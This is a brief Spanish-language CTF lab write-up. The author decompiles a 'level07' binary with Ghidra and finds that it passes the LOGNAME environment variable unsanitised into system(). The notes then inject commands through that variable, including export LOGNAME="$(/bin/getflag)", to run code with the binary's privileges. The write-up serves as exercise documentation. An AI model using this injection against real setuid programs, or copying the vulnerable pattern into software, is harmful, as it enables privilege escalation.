- Entro y encuentro un binario level07
- Descargo el fichero en local
- Abro con Ghidra
int main(int argc,char **argv,char **envp)

{
  char *pcVar1;
  int iVar2;
  char *buffer;
  gid_t gid;
  uid_t uid;
  char *local_1c;
  __gid_t local_18;
  __uid_t local_14;
  
  local_18 = getegid();
  local_14 = geteuid();
  setresgid(local_18,local_18,local_18);
  setresuid(local_14,local_14,local_14);
  local_1c = (char *)0x0;
  pcVar1 = getenv("LOGNAME");
  asprintf(&local_1c,"/bin/echo %s ",pcVar1);
  iVar2 = system(local_1c);
  return iVar2;
}

- Está el binario ejecuta un echo sobre el valor de la variable de entrono "LOGNAME"
- intento inllectar un commando en la variable
- export LOGNAME="$(echo hola)"; otuput = hola
- tengo salida de la ejecución de un comando
- export LOGNAME="$(/bin/getflag)"
